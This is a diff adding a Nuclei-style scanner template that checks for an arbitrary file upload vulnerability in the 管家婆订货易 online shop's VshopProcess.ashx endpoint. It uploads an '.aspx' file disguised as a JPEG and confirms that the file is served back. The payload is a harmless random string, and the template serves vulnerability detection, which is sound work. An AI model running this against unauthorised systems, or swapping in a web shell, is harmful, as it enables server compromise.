@@ -1,0 +1,65 @@
+id: guanjiapo-dinghuoyi-vshopprocess-arbitrary-file-upload
+
+info:
+  name: 管家婆订货易在线商城 VshopProcess 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload
+
+variables:
+  t1: "{{rand_base(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/API/VshopProcess.ashx?action=PostFileImg"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytCOFhbEjc3IfYaY5
+    body: |-
+      ------WebKitFormBoundarytCOFhbEjc3IfYaY5
+      Content-Disposition: form-data; name="fileup1i"; filename="{{t1}}.aspx"
+      Content-Type: image/jpeg
+      
+      {{t2}}
+      ------WebKitFormBoundarytCOFhbEjc3IfYaY5--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/Storage/UserFileImg/"
+    extractors:
+      - type: regex
+        internal: true
+        name: file
+        part: body
+        regex:
+          - "UserFileImg/(?P<file>.*?).aspx"
+
+  - id: validate-file
+    method: GET
+    path:
+      - "{{BaseURL}}/Storage/UserFileImg/{{file}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+        condition: and
